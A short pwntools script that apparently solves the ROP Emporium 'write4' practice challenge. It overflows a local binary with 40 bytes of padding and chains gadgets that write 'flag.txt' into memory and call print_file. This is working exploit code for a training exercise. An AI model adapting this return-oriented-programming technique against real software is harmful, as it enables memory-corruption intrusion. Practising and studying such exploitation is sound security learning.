#!/usr/bin/env python3

from pwn import *

elf = ELF('./write4')

context.bits = 64

gdbscript = """
b * main
r 
b * print_file
"""

p = elf.process()

write_addr = p64(0x0000000000601030)
mov14f15ret = p64(0x400628)
pop14pop15ret = p64(0x400690)
poprdi = p64(0x0000000000400693)
printfile_addr = elf.symbols['print_file']
# context.update(arch="amd64", endian="little", os="linux", log_level="info")

# gdb.attach(p, gdbscript)

usefulFunction = elf.symbols['usefulFunction']

payload = flat( 
    b'A'*40,
    pop14pop15ret,
    write_addr,
    b'flag.txt',
    mov14f15ret,
    poprdi,
    write_addr,
    printfile_addr,
)

p.send(payload)
p.interactive()